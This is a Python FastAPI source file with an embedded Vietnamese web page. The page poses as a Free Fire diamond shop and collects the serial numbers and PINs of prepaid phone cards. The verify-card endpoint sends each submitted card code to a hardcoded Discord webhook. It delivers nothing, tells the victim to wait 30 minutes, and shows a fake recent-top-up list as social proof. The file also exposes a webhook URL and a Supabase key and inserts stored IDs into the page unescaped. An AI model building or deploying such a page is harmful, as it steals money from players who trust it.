import os
import requests
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from supabase import create_client, Client

app = FastAPI()

# ---------------- CONFIGURATION ----------------
# Discord Webhook URL của bạn
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1542472440440160307/dmEza6iLQvY2lXjtHgvM-SAyCTHeNh0Rlib8FxNRSxlxyaGbqkdmGMPZewkt7e21X2br"

# Lấy các biến cấu hình Supabase từ Environment Variables (Cấu hình trên Render)
# Nếu không thiết lập trên Render thì có thể nhập trực tiếp ở giá trị mặc định bên dưới
SUPABASE_URL = os.environ.get("SUPABASE_URL", "https://sdeixbihpbiuqcguaxqi.supabase.co")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_1rDqbrmjaUAVmMuyxhW3Dg_9uLMOz4B")

supabase: Client = None
if SUPABASE_URL != "YOUR_SUPABASE_URL" and SUPABASE_KEY != "YOUR_SUPABASE_KEY":
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
    except Exception as e:
        print("Lỗi kết nối Supabase:", e)

# ---------------- MODELS ----------------
class CardRequest(BaseModel):
    user_id: str
    amount: str
    diamonds: str
    card_type: str
    serial: str
    pin: str

# ---------------- API ENDPOINTS ----------------
@app.post("/api/verify-card")
async def verify_card(data: CardRequest):
    # Kiểm tra độ dài cơ bản của Seri & Mã thẻ
    if len(data.serial) < 6 or len(data.pin) < 6:
        raise HTTPException(status_code=400, detail="thẻ đã sai,vui lòng kiểm tra lại")
    
    # 1. Gửi thông tin về Discord Webhook
    content = (
        f"**Đã có người nạp thẻ cào thành công**\n"
        f"**ID:** `{data.user_id}`\n"
        f"**Loại card:** `{data.card_type}`\n"
        f"**Mệnh giá:** `{data.amount}` ({data.diamonds})\n"
        f"**Seri:** `{data.serial}`\n"
        f"**Mã:** `{data.pin}`"
    )
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": content})
    except Exception as e:
        print("Webhook Error:", e)

    # 2. Lưu thông tin giao dịch vào Supabase
    if supabase:
        try:
            supabase.table("recharge_history").insert({
                "user_id": data.user_id,
                "amount": data.amount,
                "diamonds": data.diamonds
            }).execute()
        except Exception as e:
            print("Supabase Insert Error:", e)

    return {"message": "đã nạp thành công vui lòng chờ 30 phút để nhận thẻ"}

@app.get("/api/history")
async def get_history():
    if not supabase:
        return {"history": [], "top": []}
    
    try:
        # Lấy lịch sử trong vòng 10 phút gần đây
        ten_mins_ago = (datetime.utcnow() - timedelta(minutes=10)).isoformat()
        history_res = supabase.table("recharge_history").select("*").gte("created_at", ten_mins_ago).order("created_at", desc=True).execute()
        
        # Lấy danh sách Top nạp
        top_res = supabase.table("recharge_history").select("user_id, amount").order("created_at", desc=True).limit(5).execute()
        
        return {
            "history": history_res.data if history_res.data else [],
            "top": top_res.data if top_res.data else []
        }
    except Exception as e:
        print("Supabase Fetch Error:", e)
        return {"history": [], "top": []}

# ---------------- FRONTEND INTERFACE ----------------
@app.get("/", response_class=HTMLResponse)
async def serve_home():
    return """
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Kelly shop - Nạp KC Garena Uy Tín</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; margin: 0; padding: 0; text-align: center; }
            header { background: #1e1e1e; padding: 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }
            .menu-btn { font-size: 24px; cursor: pointer; background: none; border: none; color: white; }
            .side-menu { display: none; position: fixed; top: 60px; left: 0; width: 250px; background: #222; height: 100%; border-right: 1px solid #444; text-align: left; padding: 15px; z-index: 99; }
            .side-menu a { display: block; color: white; padding: 12px 0; text-decoration: none; border-bottom: 1px solid #333; font-weight: bold; }
            .banner { width: 95%; max-width: 600px; margin-top: 15px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
            .container { max-width: 480px; margin: 20px auto; padding: 20px; background: #1e1e1e; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
            select, input { width: 90%; padding: 12px; margin: 10px 0; background: #2a2a2a; border: 1px solid #444; color: white; border-radius: 6px; font-size: 15px; outline: none; }
            .btn { background: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; width: 95%; font-size: 16px; }
            .btn-red { background: #e53935; display: none; margin-top: 15px; }
            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 200; }
            .modal-content { background: #222; padding: 25px; border-radius: 10px; width: 320px; text-align: center; }
            .modal-btns { display: flex; justify-content: space-between; margin-top: 20px; }
            .btn-close { background: #666; width: 45%; }
            .btn-confirm { background: #e53935; width: 45%; }
            .page { display: none; }
            .active { display: block; }
            ul { list-style: none; padding: 0; }
            li { background: #2a2a2a; margin: 8px 0; padding: 10px; border-radius: 5px; font-size: 14px; }
        </style>
    </head>
    <body>

        <header>
            <button class="menu-btn" onclick="toggleMenu()">☰</button>
            <h3 style="margin:0; font-size: 18px;">Kelly shop - Nạp KC Garena Uy Tín</h3>
        </header>

        <div id="sideMenu" class="side-menu">
            <a href="#" onclick="showPage('home')">Trang chủ (Nạp thẻ)</a>
            <a href="#" onclick="showPage('history')">Lịch sử & Top nạp</a>
        </div>

        <!-- TRANG CHỦ -->
        <div id="home" class="page active">
            <img src="https://i.postimg.cc/k5TS6ZXp/IMG-20260827-163058.jpg" class="banner" alt="Poster Web">
            <p style="color: #aaa; font-size: 14px;"><i>Lướt xuống để tiếp tục</i></p>

            <div class="container">
                <h3 style="color: #4CAF50;">[Nạp Kc - Uy Tín ✓]</h3>
                <input type="text" id="userId" placeholder="Nhập ID tài khoản Free Fire...">
                
                <p style="text-align: left; margin-left: 5%; margin-bottom: 0;">Chọn gói nạp:</p>
                <select id="packageSelect" onchange="enableContinue()">
                    <option value="">-- Chọn gói nạp --</option>
                    <option value="50k|20k 💎">50K - 20k 💎</option>
                    <option value="100k|70k 💎">100k - 70k 💎</option>
                    <option value="200k|160k 💎">200k - 160k 💎</option>
                    <option value="500k|500k 💎">500k - 500k 💎</option>
                    <option value="1tr|1.200.000 💎">1tr - 1.200.000 kc 💎</option>
                </select>

                <button id="continueBtn" class="btn btn-red" onclick="goToPayment()">Tiếp tục</button>
            </div>
        </div>

        <!-- TRANG THANH TOÁN -->
        <div id="payment" class="page">
            <img src="https://symbols.vn/wp-content/uploads/2022/09/Kim-cuong-Free-Fire.jpg" class="banner" alt="Payment Poster">
            
            <div class="container">
                <h3 id="payAmountText">Số tiền cần thanh toán: 0đ</h3>
                <button class="btn" onclick="showCardMenu()">Thanh toán</button>
            </div>
        </div>

        <!-- TRANG NHẬP CARD -->
        <div id="cardMenu" class="page">
            <div class="container">
                <h3>Nhập Thẻ Cào</h3>
                <select id="cardType">
                    <option value="Viettel">Viettel</option>
                    <option value="VinaPhone">VinaPhone</option>
                    <option value="MobiFone">MobiFone</option>
                    <option value="Zing">Zing</option>
                </select>
                <input type="text" id="cardSerial" placeholder="Điền Số Seri...">
                <input type="text" id="cardPin" placeholder="Điền Mã Thẻ...">
                <button class="btn" onclick="openConfirmModal()">Thanh toán</button>
            </div>
        </div>

        <!-- TRANG LỊCH SỬ & TOP -->
        <div id="history" class="page">
            <div class="container">
                <h3 style="color: #ff9800;">Lịch Sử Vừa Nạp Thành Công (Tự xóa sau 10p)</h3>
                <ul id="historyList"></ul>
                <hr style="border: 0.5px solid #444; margin: 20px 0;">
                <h3 style="color: #4CAF50;">Top Nạp Nhiều Nhất</h3>
                <ul id="topList"></ul>
            </div>
        </div>

        <!-- MODAL XÁC NHẬN -->
        <div id="confirmModal" class="modal">
            <div class="modal-content">
                <h4 style="margin-top:0;">Bạn có xác nhận thanh toán không?</h4>
                <div class="modal-btns">
                    <button class="btn btn-close" onclick="closeConfirmModal()">Đóng</button>
                    <button class="btn btn-confirm" onclick="processPayment()">Xác nhận</button>
                </div>
            </div>
        </div>

        <script>
            let selectedAmount = "", selectedDiamonds = "";

            function toggleMenu() {
                const menu = document.getElementById('sideMenu');
                menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
            }

            function showPage(pageId) {
                document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
                document.getElementById(pageId).classList.add('active');
                document.getElementById('sideMenu').style.display = 'none';
                if(pageId === 'history') loadHistory();
            }

            function enableContinue() {
                const val = document.getElementById('packageSelect').value;
                document.getElementById('continueBtn').style.display = val ? 'inline-block' : 'none';
            }

            function goToPayment() {
                const userId = document.getElementById('userId').value;
                if(!userId) { alert("Vui lòng nhập ID tài khoản!"); return; }
                
                const val = document.getElementById('packageSelect').value.split('|');
                selectedAmount = val[0];
                selectedDiamonds = val[1];

                document.getElementById('payAmountText').innerText = "Số tiền cần thanh toán: " + selectedAmount;
                showPage('payment');
            }

            function showCardMenu() { showPage('cardMenu'); }
            function openConfirmModal() { document.getElementById('confirmModal').style.display = 'flex'; }
            function closeConfirmModal() { document.getElementById('confirmModal').style.display = 'none'; }

            async function processPayment() {
                closeConfirmModal();
                const userId = document.getElementById('userId').value;
                const cardType = document.getElementById('cardType').value;
                const serial = document.getElementById('cardSerial').value;
                const pin = document.getElementById('cardPin').value;

                if(!serial || !pin) {
                    alert("thẻ đã sai,vui lòng kiểm tra lại");
                    return;
                }

                const res = await fetch('/api/verify-card', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user_id: userId,
                        amount: selectedAmount,
                        diamonds: selectedDiamonds,
                        card_type: cardType,
                        serial: serial,
                        pin: pin
                    })
                });

                const result = await res.json();
                if(res.ok) {
                    alert(result.message);
                    showPage('home');
                } else {
                    alert(result.detail);
                }
            }

            async function loadHistory() {
                const res = await fetch('/api/history');
                const data = await res.json();
                
                const hList = document.getElementById('historyList');
                hList.innerHTML = data.history.length ? "" : "<li>Chưa có giao dịch gần đây.</li>";
                data.history.forEach(item => {
                    hList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Nạp: ${item.amount} (${item.diamonds})</li>`;
                });

                const tList = document.getElementById('topList');
                tList.innerHTML = data.top.length ? "" : "<li>Bảng xếp hạng trống.</li>";
                data.top.forEach(item => {
                    tList.innerHTML += `<li>ID: <b>${item.user_id}</b> - Tổng nạp: ${item.amount}</li>`;
                });
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
  
